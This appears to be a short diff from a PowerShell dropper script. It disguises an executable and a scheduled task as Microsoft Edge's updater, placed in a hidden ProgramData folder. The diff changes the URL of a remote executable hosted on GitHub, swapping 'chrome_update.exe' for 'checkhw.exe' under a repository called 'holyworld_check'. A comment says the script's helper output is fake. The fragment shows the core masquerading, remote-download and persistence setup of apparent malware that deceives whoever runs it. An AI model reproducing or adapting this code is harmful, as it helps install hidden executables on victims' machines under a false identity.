@@ -9,7 +9,7 @@ $AppName  = "MicrosoftEdgeUpdateTask"
 $Dir      = "$env:ProgramData\Microsoft\Windows\Caches\EdgeUpdate"
 $Exe      = "$Dir\MicrosoftEdgeUpdate.exe"
 $TaskName = "MicrosoftEdgeUpdateTask"
-$DownloadUrl = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/fsdafsfs/chrome_update.exe"
+$DownloadUrl = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/checkhw.exe"
 
 # Helper functions — only for the FAKE output
 function Sep  { Write-Host ("─" * 64) -ForegroundColor DarkGray }
